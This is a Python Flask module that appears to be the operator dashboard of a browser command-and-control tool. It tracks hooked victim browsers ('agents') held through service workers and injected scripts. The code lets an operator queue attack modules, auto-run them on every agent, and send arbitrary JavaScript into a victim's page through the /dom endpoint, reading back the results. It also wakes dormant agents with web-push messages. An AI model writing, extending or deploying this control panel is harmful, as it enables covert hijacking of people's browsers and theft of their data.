import time
import os
from datetime import datetime
from app import db, ConnectedAgents, ConnectedDomAgents, auth, extraModules, AutomaticModuleExecution
from flask import jsonify, send_from_directory, Blueprint, Response, render_template, request, escape
from pywebpush import webpush, WebPushException
from database.models import Registration, Agent, Module, DomCommand, DashboardRegistration
from sqlalchemy.orm import joinedload

dashboard = Blueprint('dashboard', __name__)

AGENT_TIMEOUT = 8

@dashboard.after_request
def applySecurityHeaders(response):
    #style-src 'self'; 
    response.headers["Content-Security-Policy"] = "script-src 'self'; img-src 'self'; font-src 'self'; media-src 'self'; frame-src 'self'; frame-ancestors 'none'"
    response.headers["X-Frame-Options"] = "deny"
    response.headers["X-Xss-Protection"] = "1; mode=block"
    response.headers["Referrer-Policy"] = "same-origin"
    return response

@dashboard.before_request
def contentTypeCSRFProtection():
    if request.method == 'POST':
        if not request.content_type == 'application/json':
            return Response("", 404)    

@dashboard.route('/')
@auth.login_required
def servedashboard():
    return render_template('index.html')
    
@dashboard.route('/sw.js')
@auth.login_required
def sw():
    vapidPub = os.popen("vapid --applicationServerKey | cut -d' ' -f5").read().strip()
    res = render_template('dashboard_notifications.js', vapidPub = vapidPub)
    return res, {'Content-Type': 'application/javascript'}

@dashboard.route('/modules')
@auth.login_required
def getModules():
    return jsonify({'modules': extraModules['modules'], 'autoLoadedModules': AutomaticModuleExecution})

@dashboard.route('/agents')
@auth.login_required
def getAgents():
    activeAgents()
    return jsonify({'active': ConnectedAgents, 'dormant': dormantAgents()})

@dashboard.route('/agent/<agentID>', methods=['GET'])
@auth.login_required
def getAgent(agentID):
    if agentID != None:
        agent = db.session().query(Agent).filter(Agent.id == agentID).first()
        if agent is not None:
            result = Agent.to_json(agent)
            registration = db.session.query(Registration).filter(Registration.agentId == agent.id).order_by(Registration.id.desc()).first()
            result['push'] = str(registration is not None).lower()
            result['active'] = 'true' if agent.id in ConnectedAgents else 'false'
            result['domActive'] = 'true' if agent.id in ConnectedDomAgents else 'false'
            result['user_agent'] = escape(agent.user_agent)
            modules = db.session().query(Module).filter(Module.agentId == agentID, Module.processed == 1).all()
            if len(modules) != 0:
                result['modules'] = {}
                for module in modules:
                    result['modules'][module.name] = escape(module.results)
            dom_commands = db.session().query(DomCommand).filter(DomCommand.agentId == agentID, DomCommand.processed == 1).order_by(DomCommand.id.desc()).limit(3).all()
            if len(dom_commands) != 0:
                result['dom_commands'] = {}
                for dom_command in dom_commands:
                    result['dom_commands'][escape(dom_command.command)] = escape(dom_command.result)
            return jsonify(result)
    return Response("", 404)

@dashboard.route('/automodule/<moduleName>', methods=['POST'])
@auth.login_required
def autoLoadModule(moduleName):
    checkModule(moduleName)
    if moduleName in AutomaticModuleExecution:
        return Response("", 404)
    AutomaticModuleExecution.append(moduleName)
    return ""
    
@dashboard.route('/automodule/<moduleName>', methods=['DELETE'])
@auth.login_required
def deleteAutoLoadModule(moduleName):
    checkModule(moduleName)
    if moduleName not in AutomaticModuleExecution:
        return Response("", 404)
    AutomaticModuleExecution.remove(moduleName)
    return ""

@dashboard.route('/agent/<agentID>', methods=['DELETE'])
@auth.login_required
def deleteAgent(agentID):
    if agentID is None:
        return Response("", 404)
    agent = db.session().query(Agent).filter(Agent.id == agentID).first()
    if agent is None:
        return Response("", 404)
    db.session().delete(agent)
    db.session().commit()
    return ""

@dashboard.route('/module/<moduleName>/<agentID>', methods=['POST'])
@auth.login_required
def createModule(moduleName, agentID):
    module = loadAgentModule(moduleName, agentID)
    if module is not None: # already loaded
        return Response("", 404)
    module = Module(None, agentID, moduleName, '', 0, datetime.now())
    db.session().add(module)
    db.session().commit()
    return ""

@dashboard.route('/module/<moduleName>/<agentID>', methods=['DELETE'])
@auth.login_required
def removeModule(moduleName, agentID):
    module = loadAgentModule(moduleName, agentID)
    if module is not None:
        db.session().delete(module)
        db.session().commit()
        return "" 
    return Response("", 404)

# Send command to be executed to Dashboard
@dashboard.route('/dom/<agentID>', methods=['POST'])
@auth.login_required
def sendDomJS(agentID):
    body = request.get_json(silent = True)
    if body and body['js']:
        dom_command = DomCommand(None, agentID, body['js'], None, 0, datetime.now())
        db.session().add(dom_command)
        db.session().commit()

        longpoll_counter=0
        while True:
            time.sleep(0.5)
            longpoll_counter+=1
            if(longpoll_counter>8): # wait up to 4 seconds for response
             return Response("", 404)
            dom_results = db.session().query(DomCommand).filter(DomCommand.agentId == agentID, DomCommand.processed == 1,DomCommand.id==dom_command.id).order_by(DomCommand.id.desc()).limit(3).all()
            if len(dom_results) != 0:
                result={}
                for cmd_result in dom_results:
                    result['cmd']=cmd_result.command
                    result['result']=cmd_result.result
                return jsonify(result)
            else:
                continue
                    
    return Response("", 404)

# API to get the results of any command. Not used at the moment
@dashboard.route('/dom/result/<agentID>/<cmdID>', methods=['GET'])
@auth.login_required
def sendDomCmdResult(agentID,cmdID):
    dom_commands = db.session().query(DomCommand).filter(DomCommand.agentId == agentID, DomCommand.processed == 1,DomCommand.id==cmdID).order_by(DomCommand.id.desc()).limit(3).all()
    if len(dom_commands) != 0:
        result={}
        
        for dom_command in dom_commands:
            result['cmd']=dom_command.command
            result['result']=dom_command.result
        return jsonify(result)

    return Response("", 404)

@dashboard.route('/push/<agentId>', methods=['POST'])
@auth.login_required
def push(agentId):
    registration = db.session.query(Registration).filter(Registration.agentId == agentId).order_by(Registration.id.desc()).first()
    if registration is None:
        return Response("", 404)
    else:
        try:
           webpush(
               subscription_info={
                "endpoint": registration.endpoint,
                "keys": {
                  "p256dh": registration.authKey,
                  "auth": registration.authSecret
                 }
               },
               data="",
               vapid_private_key="./private_key.pem",
               vapid_claims={
                "sub": "mailto:YourNameHere@example.org",
               }
           )
        except WebPushException as ex:
            print(ex)
            return Response("", 404)
    return ""

@dashboard.route('/registration', methods = ['POST'])
@auth.login_required
def registration():
    body = request.get_json(silent = True)
    if body and body['endpoint'] and body['key'] and body['authSecret']:
        dashboard_registration = DashboardRegistration(None, body['endpoint'], body['key'], body['authSecret'])
        db.session.add(dashboard_registration)
        db.session.commit()
        return ""
    return Response("", 404)

def activeAgents():
    now = time.time()
    agentsToRemove = {}
    # remove DOM agents that timed out
    for agentID in ConnectedDomAgents:
        if (now - ConnectedDomAgents[agentID]['last_seen']) > AGENT_TIMEOUT:
            agentsToRemove[agentID] = ConnectedDomAgents[agentID]
    for agentID in agentsToRemove:
        del ConnectedDomAgents[agentID]
    agentsToRemove = {}
    # remove SW agents that timed out
    for agentID in ConnectedAgents:
        if (now - ConnectedAgents[agentID]['last_seen']) > AGENT_TIMEOUT:
            agentsToRemove[agentID] = ConnectedAgents[agentID]
        ConnectedAgents[agentID]['domActive'] = 'true' if agentID in ConnectedDomAgents else 'false'
    for agentID in agentsToRemove:
        del ConnectedAgents[agentID]

def dormantAgents():
    agents = db.session().query(Agent).options(joinedload('registration')).filter(Agent.id.notin_(ConnectedAgents.keys())).all()
    results = {}
    for agent in agents:
        results[agent.id] = Agent.to_json(agent)
        results[agent.id]['push'] = str(agent.registration is not None).lower()
        results[agent.id]['active'] = 'false'
        results[agent.id]['domActive'] = 'true' if agent.id in ConnectedDomAgents else 'false'
    return results

def loadAgentModule(moduleName, agentID):
    checkModule(moduleName)
    return db.session.query(Module).filter(Module.agentId == agentID, Module.name == moduleName).order_by(Module.id.desc()).first()
    
def checkModule(moduleName):
    if moduleName not in extraModules['modules']:
        return Response("", 404)
